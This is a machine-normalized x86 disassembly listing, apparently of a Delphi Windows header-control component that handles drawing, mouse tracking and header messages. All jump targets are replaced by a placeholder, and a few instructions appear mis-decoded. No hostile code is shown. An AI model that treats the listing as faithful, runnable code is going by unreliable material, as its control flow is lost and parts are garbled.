xor edx edx
call sub_424ba0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424a18
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_436e7c
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
xor edx edx
mov eax ebx
call sub_436c18
mov edx esi
mov eax ebx
call sub_44b1e4
pop esi
pop ebx
retn
sub_436e9c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40346c
sub_436edc
push ebx
mov ebx eax
cmp dl [ ebx + 0x217 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x217 ] dl
test dl dl
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
call sub_436a60
xor edx edx
mov eax ebx
call sub_446890
sub_436f44
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_420f8c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
jne r-xdata
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov edx [ esi + 0x7c ]
mov eax ebx
call sub_4367e4
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_4192c0
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_436430
mov edx [ esi + 0x7c ]
call sub_43638c
sub_437009
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44ca40
mov dl 0x1
mov eax ebx
call sub_437038
pop ebx
pop ebp
retn 0x8
sub_437038
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax edi
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
cmp bl [ edi + 0x216 ]
je r-xdata
mov al [ esi + 0x229 ]
sub al 0x2
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x216 ] bl
cmp [ esp ] 0x0
je r-xdata
lea eax [ esp + 0x1 ]
push eax
lea ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
call sub_4060bc
lea edx [ esp + 0x10 ]
mov ecx esi
mov eax edi
call sub_448c38
mov eax esi
call sub_446168
cmp eax [ esp + 0x1 ]
jne r-xdata
sub al 0x3
jne r-xdata
mov eax edi
call sub_44a5f4
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_4461ac
cmp eax [ esp + 0x5 ]
je r-xdata
mov bl 0x1
sub_4370c4
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov [ esp ] eax
cmp [ ebx + 0x232 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_437118
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44b4a8
call sub_43af70
mov ecx esp
mov dl 0x1
call sub_43b2dc
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
push 0x0
call sub_43af70
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
call sub_43b10c
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_437178
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_418ea4
mov eax esi
call sub_437278
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4371d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b4c
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_437384
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4373ac
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_437358
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_437334
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_437304
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_437374
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_4373f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437278
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40346c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40346c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_43724c
mov [ ebx + 0x25 ] 0x1
sub_4372e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_40403c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418f48
sub_437314
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40346c
sub_437384
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_4043f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40403c
xor edx edx
mov eax ebx
call sub_418f0c
sub_4373ac
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_418f30
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_4192c0
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_418f0c
sub_437404
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_419088
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_43746c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_437c78
pop esi
pop ebx
retn
mov eax esi
call sub_418f30
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_437c54
pop esi
pop ebx
retn
sub_437498
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_4192c0
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_4192c0
mov edi eax
dec edi
sub_4374e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448d80
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_445c78
mov edx 0x11
mov eax ebx
call sub_445f44
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_445340
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438498
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4375b8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403270
mov eax [ esi + 0x208 ]
call sub_403270
mov eax [ esi + 0x224 ]
call sub_403270
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448ea4
test bl bl
jle r-xdata
call sub_403270
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_437610
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_436150
mov edx esi
mov eax ebx
call sub_449ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_437688
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191ec
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437710
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d9e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41c0a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_43773c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a00c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_45394c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437c78
push ebp
call sub_437688
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_453a88
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
pop edx
call sub_429a60
pop ebx
pop ecx
pop ebp
retn
sub_4377a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_437832
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41e550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437839
mov eax [ ebp - 0x8 ]
call sub_403270
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41a988
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_437848
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c3d0
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4192c0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437454
call sub_437278
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437454
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_4378a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_446168
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437454
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_437404
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4379ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437454
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4379f5
mov eax [ ebp - 0x10 ]
call sub_403270
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_437448
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437454
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_437454
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437454
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4379f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_437c78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4192c0
mov edx eax
dec edx
mov eax ebx
call sub_437454
mov edx [ ebp - 0x8 ]
call sub_4373ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437454
mov edx [ ebp - 0xc ]
call sub_4373ac
sub_437a50
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_42477c
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_437acc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_437b58
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_437454
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402c84
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4044a8
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4042a8
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_4372c8
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_443544
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_4372b0
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_418f30
push eax
push edi
mov eax esi
call sub_44d054
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_437c54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_437b58
sub_437c78
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_44d054
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_44d054
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_437b58
inc edi
dec ebx
jne r-xdata
sub_437cf4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_42482c
xor eax eax
push ebp
push sub_437df5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424ba0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424a40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4240e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424200
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437dfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_424ba0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424a18
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_437e0c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je sub_4380ce
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_40346c
jmp sub_4380ce
sub eax 0xfffffec9
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je sub_4380ce
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je sub_4380ce
jmp sub_4380ce
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_4461ac
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40346c
jmp sub_4380ce
mov eax [ ebp - 0x4 ]
call sub_43863c
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp sub_4380ce
mov eax [ ebp - 0x4 ]
call sub_44d054
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_429a44
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_437fa2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_429a44
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4383d0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp sub_4380ce
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4380ce
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_437fdd
inc ebp
out dx eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_429a44
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_429a44
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4383d0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp sub_4380ce
sub_4380d4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_43810c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44aa68
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_4380d4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44698c
